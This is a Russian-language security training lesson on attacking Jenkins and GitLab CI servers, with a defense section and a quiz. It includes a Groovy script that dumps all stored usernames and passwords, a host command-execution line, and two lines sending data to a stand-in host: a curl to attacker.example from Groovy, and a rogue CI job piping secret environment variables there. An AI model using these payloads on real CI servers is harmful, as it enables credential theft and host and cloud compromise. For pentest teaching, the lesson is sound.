---
id: cloud-cicd-jenkins
title: "Jenkins и GitLab CI: эксплуатация CI/CD серверов"
category: cloud
parent: cloud-cicd-secrets
difficulty: hard
order: 3
tags: [cloud, jenkins, gitlab-ci, ci, rce, credentials, script-console]
prerequisites: [cloud-cicd-secrets, cloud-cicd-github-actions]
useful_for:
  - "Эксплуатация Jenkins/GitLab CI"
  - "Получение облачных кредов из CI"
  - "Пентест внутренней инфраструктуры"
estimated_minutes: 55
summary: "Как атаковать Jenkins и GitLab CI: script console, Groovy RCE, credentials store, GitLab runners и pipeline injection. Пути к облачным кредам и хосту."
---
## Задача

GitHub Actions мы разобрали. Но в корпоративных сетях до сих пор живут **self-hosted CI-серверы**: Jenkins и GitLab. Они ближе к «обычному хосту»: у них есть веб-интерфейс, плагины и хранилище кредов. Задача — показать, как доступ к такому серверу превращается в выполнение кода и кражу облачных секретов. Разберём на Jenkins.

## Данные: что открыто у Jenkins

Находим Jenkins на `https://ci.acme.io`. Первым делом смотрим, что доступно без аутентификации:

```
$ curl -s https://ci.acme.io/api/json | jq '.jobs[].name'
"deploy-prod"
"build-api"
"release-worker"
$ curl -s -o /dev/null -w "%{http_code}\n" https://ci.acme.io/script
200
```

Две вещи: список job'ов отдаётся анонимно (`/api/json`), и — главное — страница `/script` отвечает `200`. Это **Script Console** Jenkins, и она не защищена.

## Пробуем в лоб: что вообще даёт Jenkins

Jenkins запускает сборки на агентах, а креды (пароли, ключи, токены, облачные креды) хранятся в его **credentials store** и подставляются в джобы. Значит, если мы исполняем код **внутри** Jenkins (в Groovy-консоли или в пайплайне), мы получаем доступ ко всем кредам, к которым у сервера есть права.

Проверим версию — вдруг есть известная дыра:

```
$ curl -s https://ci.acme.io/login | grep -o 'Jenkins [0-9.]*'
Jenkins 2.414.1
```

Но нам даже не нужна CVE: консоль открыта.

## Приём: Groovy RCE через Script Console

Script Console принимает **Groovy** — язык, работающий на JVM, где живёт Jenkins. Из него доступен весь Java API сервера, включая хранилище кредов. Вытаскиваем все логины/пароли:

```groovy
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
  Jenkins.instance, null, null)
creds.each { c -> println(c.id + ":" + c.username + ":" + c.password) }
```

Отправляем через API:

```
$ curl -s --data-urlencode 'script=println("id=" + System.getProperty("user.name"))' https://ci.acme.io/scriptText
id=jenkins
```

Так же одной строкой Groovy можно выполнить системную команду — это полноценный RCE на хосте Jenkins:

```groovy
println "curl -s https://attacker.example/?x=$(id)".execute().text
```

## Полный прогон: от /script до облачных кредов

1. **Разведка.** `/api/json` → список job'ов; `/script` → 200 (не защищено).
2. **Читаем креды.** Groovy-скриптом обходим credentials store.
3. **Ищем облачные креды.** Среди найденных — `AWS_ACCESS_KEY_ID`/`SECRET`, `AZURE_*`, `GCP_*`.
4. **Проверяем.** Уходим с хоста с добытым ключом:

```
$ AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity
{ "Arn": "arn:aws:iam::123456789012:user/jenkins-deploy" }
```

5. **RCE на хосте.** Если нужно — `execute()` запускает команды от пользователя `jenkins`.

Важно: Jenkins часто запускается в контейнере с **примонтированным `docker.sock`**, чтобы собирать образы. Тогда из RCE легко выйти на хост (см. `cloud-docker-socket`).

## GitLab CI: похожая история

GitLab не имеет «script console», но даёт не меньше:

- **CI/CD Variables** проекта. Переменная, помеченная *protected*, доступна только на защищённых ветках — но пуш в `main` (или запуск job'а на нужной ветке) снимает ограничение.
- **`.gitlab-ci.yml`** контролирует, что запускается. Если у нас есть право на MR, можно подсунуть job, читающий переменные:

```yaml
steal:
  script:
    - env | grep -i -E 'AWS|TOKEN|SECRET' | curl -s -d @- https://attacker.example/x
```

- **`CI_JOB_TOKEN`** — токен job'а; им можно ходить в API GitLab и, при слабых настройках, в другие проекты.
- **Runners.** Shared-runner разделён между проектами; specific-runner — полноценный хост. Если раннер **privileged** и монтирует `docker.sock`, из job'а можно захватить хост.

Проверить раннеры и переменные (с доступом к API):

```
$ curl -s --header "PRIVATE-TOKEN: $GL_TOKEN" https://gitlab.acme.io/api/v4/projects/1/variables | jq '.[].key'
"AWS_ACCESS_KEY_ID"
"DEPLOY_TOKEN"
```

## Плагины, агенты и что ещё цеплять

Jenkins почти всегда увешан плагинами, и каждый — потенциальная дыра. Быстрая разведка:

- **`/manage` и `/configure`** — открыты ли настройки анонимно.
- **Агенты** (`/computer/`) — подключённые ноды; на них можно запускать job'ы.
- **`/whoAmI/api/json`** — что нам разрешено как анонимному пользователю.
- **`/pluginManager/api/json`** — список плагинов и версий (ищем известные CVE).

```
$ curl -s https://ci.acme.io/pluginManager/api/json | jq -r '.plugins[].shortName' | head
credentials
git
pipeline
matrix-auth
```

Если в списке нет `matrix-auth` — разграничение прав, скорее всего, не настроено, и анонимный доступ к `/script` закономерен. Наоборот, наличие `matrix-auth` ещё не значит, что он настроен правильно: часто роль `anonymous` имеет `Overall/Read`, а иногда и больше.

## Защита и что ломает атаку

- **Закрыть Script Console** (Matrix Authorization, `Overall/Administer` только админам).
- **Не хранить облачные креды как статические** — использовать OIDC (см. `cloud-oidc-federation`).
- **Protected + masked переменные** в GitLab и запрет на незащищённые ветки.
- **Не монтировать `docker.sock`** в раннеры; использовать rootless-сборку.
- **Изоляция раннеров** — эфемерные агенты на каждый job.

## Если не сработало

- **Script Console закрыта** — смотрите другие плагины с RCE, агентов, `/computer/(built-in)/log`.
- **Креды в Vault/KMS** — статического ключа нет.
- **Protected-ветки без права пуша** — переменные недоступны.
- **Эфемерные раннеры** — следов и файлов на диске почти нет.

## Мини-сценарий: /script за несколько шагов

1. **Проверка.** `curl -s -o /dev/null -w '%{http_code}' https://ci.acme.io/script` → `200`. Консоль не защищена.
2. **Разведка job'ов.** `curl -s https://ci.acme.io/api/json | jq '.jobs[].name'` → `deploy-prod`, `build-api`.
3. **Чтение кредов.** Groovy-скриптом обходим credentials store:

```groovy
def c = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
  Jenkins.instance, null, null)
c.each { println(it.id + ":" + it.username + ":" + it.password) }
```

4. **Добыча.** Среди кредов — `AWS_ACCESS_KEY_ID`/`SECRET` от `jenkins-deploy`.
5. **Проверка.** `aws sts get-caller-identity` с этими кредами → роль деплоя.
6. **RCE на хосте.** `println "id".execute().text` исполняет команды от пользователя `jenkins`; если смонтирован `docker.sock` — выход на хост.

Открытая `/script` — это сразу и креды, и выполнение кода.

## Что мы теперь знаем

1. Jenkins Script Console = Groovy RCE и доступ к credentials store.
2. GitLab CI Variables и `CI_JOB_TOKEN` — источники секретов.
3. Раннеры часто дают выход на хост (особенно с `docker.sock`).
4. Статические облачные креды в CI — прямой путь в облако.
5. Защита — закрытая консоль, OIDC, protected-переменные, изоляция.

## На что смотреть дальше

- `/script` и `/scriptText` на Jenkins (200 или редирект на логин).
- `/api/json`, `/computer/`, открытые job'ы.
- GitLab: CI/CD Variables, protected-флаги, раннеры.
- Монтируется ли `docker.sock` в раннеры/агенты.
- Есть ли статические облачные креды в credentials store.

## Быстрая проверка

Три запроса без аутентификации многое расскажут о Jenkins:

```bash
curl -s -o /dev/null -w '%{http_code}\n' https://ci.acme.io/script   # 200 = RCE-консоль открыта
curl -s https://ci.acme.io/api/json | jq '.jobs[].name'              # список job'ов
curl -s https://ci.acme.io/pluginManager/api/json | jq '.plugins[].shortName'
```

`200` на `/script` — считай, что Jenkins уже скомпрометирован.

## Квиз

Проверь себя.

```quiz
- question: "Что даёт Jenkins Script Console?"
  options:
    - "Выполнение Groovy-кода с доступом к API Jenkins и кредам"
    - "Только чтение логов"
    - "Смену темы интерфейса"
    - "Перезапуск агента"
  answer: 0
  explanation: "Groovy на JVM Jenkins = RCE и доступ к credentials store."
- question: "Где Jenkins хранит пароли и токены?"
  options:
    - "В credentials store"
    - "В .gitlab-ci.yml"
    - "В S3"
    - "В DNS"
  answer: 0
  explanation: "Креды лежат в credentials store и подставляются в job'ы."
- question: "Что такое protected-переменная в GitLab CI?"
  options:
    - "Переменная, доступная только на защищённых ветках/тегах"
    - "Зашифрованная переменная"
    - "Переменная только для админов"
    - "Переменная раннера"
  answer: 0
  explanation: "protected ограничивает переменную защищёнными ref."
- question: "Почему docker.sock в раннере опасен?"
  options:
    - "Через него из job'а можно захватить хост"
    - "Он замедляет сборку"
    - "Он шифрует слои"
    - "Он удаляет образы"
  answer: 0
  explanation: "Доступ к docker.sock = контроль над хостом."
- question: "Как снизить риск от CI-сервера с облачными правами?"
  options:
    - "Использовать OIDC вместо статических кредов и изолировать раннеры"
    - "Дать всем админку"
    - "Отключить логи"
    - "Хранить ключи в job-скрипте"
  answer: 0
  explanation: "OIDC + эфемерные изолированные раннеры снижают импакт."
```

## Куда дальше

В следующем уроке (`cloud-oidc-federation`) мы разберём OIDC глубже: какие условия trust-политик критичны и как звёздочка в них открывает роль кому угодно. А пока главное: CI-сервер — это хост с кредами, и RCE на нём почти всегда равен облачному доступу.

## Где пригодится

- **Bug bounty:** открытые Jenkins и GitLab.
- **Red team:** от CI-сервера к облачным кредам.
- **Пентест:** аудит CI/CD-инфраструктуры.
- **Работа/DevSecOps:** закрытая консоль, OIDC, изоляция раннеров.
- **Дальше по дереву:** `cloud-oidc-federation`, `cloud-gitlab-ci`.
